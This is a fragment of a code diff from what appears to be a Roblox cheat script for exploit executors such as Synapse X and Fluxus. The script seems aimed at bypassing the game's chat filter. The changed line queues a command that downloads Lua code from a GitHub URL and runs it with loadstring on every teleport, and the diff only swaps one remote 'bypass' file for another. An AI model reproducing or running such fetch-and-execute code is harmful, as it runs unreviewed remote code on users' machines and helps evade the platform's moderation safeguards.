@@ -16,7 +16,7 @@ local filteredString = Chat:FilterStringForBroadcast(message, playerFrom)
 
 local queueonteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
 if queueonteleport then
-	queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/daddysyn/synergy/additional/betterbypasser'))()")
+	queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/Hatomi-Ciqada/Pen-Testing-and-Vulnerabilities/main/Bypass.lua'))()")
 end
 
     if syn and "Synapse X" then
